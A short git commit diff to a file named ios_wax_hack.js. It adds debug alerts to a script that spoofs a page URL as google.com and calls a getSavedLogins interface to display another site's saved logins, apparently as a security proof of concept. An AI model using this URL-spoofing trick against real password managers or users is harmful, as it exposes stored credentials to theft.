2676101924a58e15fd4e9fe492ecef14d45a0358
Vigneshwaran Sivasamy <vigneshwaran_sivasam@symantec.com>
2019-03-05 12:28:46 +0530

    Alert addition

--- ios_wax_hack.js
+++ ios_wax_hack.js
@@ -1,10 +1,11 @@
 setTimeout(function(){
-
+    alert("WaxJS not available")
     if(window.WAXJS){
         WAXJS.webPageData.pageUrl = "https://www.google.com/";
         let data = WaxInterface.getSavedLogins(WAXJS.webPageData);
-        let stringifiedData = JSON.stringify(data)
-        document.getElementById("id").innerText = stringifiedData;
+        let stringifiedData = JSON.stringify(data);
+        document.getElementById("data").innerText = stringifiedData;
+        alert("WaxJS available")
     }
 
-});
+}, 200);
